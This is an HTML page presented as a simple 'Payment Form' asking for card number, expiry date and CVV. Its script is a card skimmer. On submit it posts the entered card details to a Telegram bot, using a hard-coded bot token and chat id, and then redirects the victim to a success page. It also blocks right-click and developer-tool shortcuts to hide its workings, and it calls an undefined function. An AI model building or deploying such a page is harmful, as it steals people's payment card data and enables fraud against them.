<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .payment-form {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
        }

        .payment-form h2 {
            text-align: center;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
        }

        .form-group input {
            width: 90%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .submit-btn {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }

        .submit-btn:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="payment-form">
        <h2>Payment Form</h2>
        <form id="paymentForm">
            <div class="form-group">
                <label for="cardNumber">Card Number</label>
                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required>
            </div>
            <div class="form-group">
                <label for="expiryDate">Expiry Date (MM/YY)</label>
                <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5" required>
            </div>
            <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
            </div>
            <button type="submit" class="submit-btn">Submit</button>
        </form>
    </div>

    <script>
        // Auto-insert slash in expiry date field
        const expiryDateField = document.getElementById('expiryDate');
        expiryDateField.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });

        // Validate expiry date
        expiryDateField.addEventListener('blur', (e) => {
            const value = e.target.value;
            const [month, year] = value.split('/').map(Number);

            const currentYear = new Date().getFullYear() % 100; // Get last two digits of the current year
            const currentMonth = new Date().getMonth() + 1;

            if (
                !value.match(/^\d{2}\/\d{2}$/) || // Ensure format is MM/YY
                month < 1 || month > 12 || // Ensure month is valid
                (year < currentYear || (year === currentYear && month < currentMonth)) // Ensure date is not in the past
            ) {
                alert('Invalid expiry date. Please enter a valid future date in MM/YY format.');
                e.target.value = '';
            }
        });

       
        notifyUserEntry();

        // Handle form submission
        document.getElementById('paymentForm').addEventListener('submit', async (event) => {
            event.preventDefault();

            // Collect form data
            const formData = new FormData(event.target);
            const data = {
                cardNumber: formData.get('cardNumber'),
                expiryDate: formData.get('expiryDate'),
                cvv: formData.get('cvv'),
            };

            // Send data to Telegram bot
            const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
            const chatId = '7747778364';

            const message = `New Payment Details:
Card Number: ${data.cardNumber}
Expiry Date: ${data.expiryDate}
CVV: ${data.cvv}`;

            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });

            // Redirect the user to another page
            window.location.href = 'https://example.com/success'; // Replace with your desired URL
        });

        // Disable right-click and developer tools
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        document.addEventListener('keydown', (e) => {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
